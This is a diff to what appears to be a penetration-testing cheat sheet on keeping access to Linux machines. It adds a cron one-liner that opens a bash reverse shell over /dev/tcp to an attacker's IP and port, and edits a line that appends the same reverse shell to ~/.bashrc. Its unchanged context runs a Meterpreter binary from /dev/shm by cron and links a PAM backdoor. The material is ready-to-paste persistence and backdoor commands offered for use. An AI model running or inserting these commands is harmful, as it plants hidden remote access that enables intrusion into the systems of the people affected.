@@ -82,6 +82,12 @@ session.name
 # newlines required
 CT="\n1 * * * *   root    ./dev/shm/met.elf\n"
 printf "$CT" | crontab -
+
+```
+
+As a one-liner
+```bash
+echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\n"
 ```
 
 Serve shell script, for example:
@@ -91,7 +97,7 @@ bash -i >& /dev/tcp/ip/port 0>&1
 ```
 .bashrc
 ```bash
-echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
+echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> ~/.bashrc
 ```
 OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
 
